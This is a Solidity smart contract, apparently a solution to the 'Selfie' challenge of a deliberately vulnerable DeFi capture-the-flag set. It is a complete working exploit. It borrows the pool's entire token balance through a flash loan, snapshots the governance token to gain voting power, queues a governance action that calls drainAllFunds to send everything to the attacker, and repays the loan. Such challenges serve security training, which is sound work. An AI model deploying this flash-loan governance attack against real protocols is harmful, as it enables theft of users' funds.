import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SelfiePool pool;
    DamnValuableTokenSnapshot public governanceToken;
    address owner;

    constructor(address poolAddress, address governanceTokenAddress, address _owner) {
        pool = SelfiePool(poolAddress);
        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
        owner = _owner;
    }

    /**
     *  @dev we get a flashloan and ask for the whole balance of the pool.
     */
    function attack() public {
        uint256 amountToBorrow = pool.token().balanceOf(address(pool));
        pool.flashLoan(amountToBorrow);
    }

    function receiveTokens(address token, uint256 amount) external {
        governanceToken.snapshot(); 
        // we need to make a snapshot to update our address and show how many tokens we have to vote and execute actions in governance
        pool.governance().queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);
        // we execute the action of transfering funds to attacker
        governanceToken.transfer(address(pool), amount);
        // we payback flashloan
        // Now we have to wait two days for the action to be executed
    }
}